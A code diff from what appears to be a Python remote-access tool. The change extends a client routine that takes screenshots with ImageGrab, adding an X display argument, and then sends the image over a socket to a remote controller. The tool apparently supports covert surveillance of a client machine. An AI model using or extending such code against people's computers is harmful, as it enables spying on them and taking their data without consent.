@@ -79,8 +79,14 @@ def download_feature(file_path, conn):
         conn.send(b"The file doesn't exist or is not readable.")
 
 
-def take_screenshot():
-    screenshot = ImageGrab.grab()
+def take_screenshot(display):
+    if display is not None:
+        # display = display.replace(":", "")
+        print(f"display = {display}")
+        screenshot = ImageGrab.grab(xdisplay=display)
+    else:
+        screenshot = ImageGrab.grab()
+
     screenshot.save("screenshot.png")
     screenshot.close()
 
@@ -90,7 +96,7 @@ def screenshot_manager(conn):
 
     if os.name == "nt":
         # Windows
-        take_screenshot()
+        take_screenshot(None)
         conn.send(b"ok")
         download_feature("screenshot.png", conn)
     else:
@@ -101,7 +107,7 @@ def screenshot_manager(conn):
             conn.send(b"NOK")
             conn.send(b"[-] No display detected on client")
         else:
-            take_screenshot()
+            take_screenshot(display_configured)
             conn.send(b"ok")
             download_feature("screenshot.png", conn)
 
